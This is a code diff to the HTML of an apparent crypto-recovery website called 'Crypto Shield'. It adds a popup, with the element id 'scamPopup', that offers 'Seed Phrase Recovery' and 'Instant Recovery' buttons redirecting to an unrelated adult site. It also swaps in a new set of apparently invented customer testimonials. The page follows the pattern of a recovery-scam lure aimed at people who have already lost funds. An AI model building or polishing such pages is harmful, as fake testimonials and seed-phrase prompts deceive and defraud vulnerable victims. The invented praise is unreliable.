@@ -61,8 +61,26 @@
             <img src="./img/hero-image.png" alt="">
         </div>
     </section>
+	
 
     <!-- Carousel -->
+	<!-- Popup Modal -->
+<div id="scamPopup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 320px; background: white; padding: 20px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3); border-radius: 10px; z-index: 1000; text-align: center;">
+    <span class="close-btn" onclick="closePopup()" style="position: absolute; top: 10px; right: 15px; font-size: 20px; cursor: pointer;">&times;</span>
+    <h2 style="margin-bottom: 15px; font-size: 18px;">Choose a Recovery Option</h2>
+    <div>
+        <div style="padding: 10px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 10px;">
+            <h3 style="margin: 5px 0;">Instant Recovery</h3>
+            <p style="font-size: 14px; color: #555;">Fast-track your funds retrieval.</p>
+            <button onclick="redirectTo('https://beeg.com/')" style="background: #007bff; color: white; padding: 8px; border: none; border-radius: 5px; cursor: pointer;">Select</button>
+        </div>
+        <div style="padding: 10px; border: 1px solid #ddd; border-radius: 8px;">
+            <h3 style="margin: 5px 0;">Seed Phrase Recovery</h3>
+            <p style="font-size: 14px; color: #555;">Recover funds using your seed phrase.</p>
+            <button onclick="redirectTo('https://beeg.com/')" style="background: #007bff; color: white; padding: 8px; border: none; border-radius: 5px; cursor: pointer;">Select</button>
+        </div>
+    </div>
+</div>
     <section>
         <div class="carouselContainer">
             <div class="eachCarousel eachCarouselBorder">
@@ -75,7 +93,8 @@
                         <span class="rect"></span>
                         <h3 class="carouselDiscount">1,452</h3>
                     </div>
-                    <button class="btn carouselBtn">Report Scams</button>
+                    <button class="btn carouselBtn" onclick="openPopup()" style="background: #007bff; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">Report Scams</button>
+
                 </article>
             </div>
     
@@ -277,30 +296,65 @@
 
     </section>
 	
-	    <div class="slider">
-        <div class="slides">
-            <div class="slide active">"Crypto Shield recovered my lost Bitcoin in record time! Highly recommended." - John D. (USA)</div>
-            <div class="slide">"Amazing service! Fast and reliable, got my stolen crypto back in just days." - Lisa T. (Canada)</div>
-            <div class="slide">"Customer support is outstanding. They guided me through every step." - Mark W. (UK)</div>
-            <div class="slide">"Best decision ever! Crypto Shield helped me retrieve funds I thought were gone forever." - Sarah M. (Australia)</div>
-            <div class="slide">"Professional and efficient, I felt secure knowing they were handling my case." - Alex P. (Germany)</div>
-            <div class="slide">"Crypto Shield exceeded my expectations. True lifesavers!" - Emily R. (South Africa)</div>
-            <div class="slide">"They work fast and keep you updated. Fantastic service!" - Brian H. (Brazil)</div>
-            <div class="slide">"Highly recommended if you've lost crypto. They recovered mine!" - Olivia N. (Japan)</div>
-            <div class="slide">"I was skeptical, but they proved me wrong. Crypto Shield delivers!" - Daniel G. (India)</div>
-            <div class="slide">"Worth every penny. Their recovery speed is incredible!" - Jessica B. (France)</div>
-            <div class="slide">"Their team is highly skilled. I got my lost Ethereum back!" - Tom V. (Nigeria)</div>
-            <div class="slide">"Crypto Shield is the best in the industry. Excellent support!" - Mike S. (Mexico)</div>
-            <div class="slide">"They recovered my USDT in just a few days. I'm beyond grateful!" - Nancy L. (Russia)</div>
-            <div class="slide">"I thought my funds were gone forever, but Crypto Shield made the impossible happen." - George K. (China)</div>
-            <div class="slide">"Very professional and transparent. No hidden fees!" - Sophia W. (Italy)</div>
-            <div class="slide">"Honest and reliable. They recovered my stolen crypto with ease." - Eric C. (Argentina)</div>
-            <div class="slide">"Great communication and efficiency. I'm recommending them to everyone!" - Alice F. (Indonesia)</div>
-            <div class="slide">"Lost hope until Crypto Shield came through. Excellent work!" - Kevin J. (UAE)</div>
-            <div class="slide">"A trustworthy service in a shady industry. Crypto Shield delivers results." - Monica H. (Kenya)</div>
-            <div class="slide">"Five stars! Fast, professional, and effective." - Peter Q. (South Korea)</div>
+	<body style="font-family: Arial, sans-serif; background-color: #0a1f44; text-align: center; padding: 50px; color: white;">
+
+    <div style="position: relative; max-width: 600px; margin: auto; background: #112d66; padding: 20px; border-radius: 10px; 
+                box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); overflow: hidden;">
+        
+        <div class="testimonial" style="display: block; opacity: 1; transition: opacity 3s ease-in-out;">
+            <p>"Crypto Shield recovered my stolen BTC within days! Fast and professional service."</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- John D., USA</p>
         </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"Lost my seed phrase, but Crypto Shield helped me regain access to my wallet!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Sarah L., UK</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"I got my lost Ethereum back instantly. Highly recommended!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Mark R., Canada</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"The best crypto recovery service—honest, fast, and reliable!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Emily W., Australia</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"I was devastated after getting scammed, but Crypto Shield helped me recover my funds."</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Ahmed K., UAE</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"Super fast and professional! My stolen USDT was recovered in just a few days."</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Chen L., China</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"I got my lost Bitcoin back, thanks to Crypto Shield’s amazing team!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- José M., Brazil</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"Their recovery process is transparent and efficient. Highly recommended!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Priya S., India</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"I accidentally sent crypto to the wrong address, but Crypto Shield recovered it!"</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Thabo N., South Africa</p>
+        </div>
+
+        <div class="testimonial" style="display: none; opacity: 0; transition: opacity 3s ease-in-out;">
+            <p>"Best crypto recovery service! I got my stolen assets back within a week."</p>
+            <p style="font-weight: bold; margin-top: 10px; color: #ffcc00;">- Hiroshi T., Japan</p>
+        </div>
+
     </div>
+
+	
+
 
     <div class="fundSection">
         <div class="sectionDesc">
@@ -416,20 +470,36 @@
     </footer>
     
 
-    <script src="./script.js"></script> 
-	
-	    <script>
-        let slides = document.querySelectorAll('.slide');
+    <script>
         let index = 0;
-
-        function showNextSlide() {
-            slides[index].classList.remove('active');
-            index = (index + 1) % slides.length;
-            slides[index].classList.add('active');
+        function showTestimonial() {
+            let testimonials = document.querySelectorAll(".testimonial");
+            testimonials.forEach((t, i) => {
+                t.style.display = "none";
+                t.style.opacity = "0";
+            });
+            index = (index + 1) % testimonials.length;
+            testimonials[index].style.display = "block";
+            setTimeout(() => { testimonials[index].style.opacity = "1"; }, 50);
         }
-
-        setInterval(showNextSlide, 3000);
+        setInterval(showTestimonial, 5000); // Change every 3 seconds
     </script>
+	<!-- JavaScript -->
+<!-- JavaScript -->
+<script>
+    function openPopup() {
+        document.getElementById("scamPopup").style.display = "block";
+    }
+
+    function closePopup() {
+        document.getElementById("scamPopup").style.display = "none";
+    }
+
+    function redirectTo(url) {
+        window.open(url, "_blank"); // Opens in a new tab
+    }
+</script>
+
 	
 </body>
 </html>
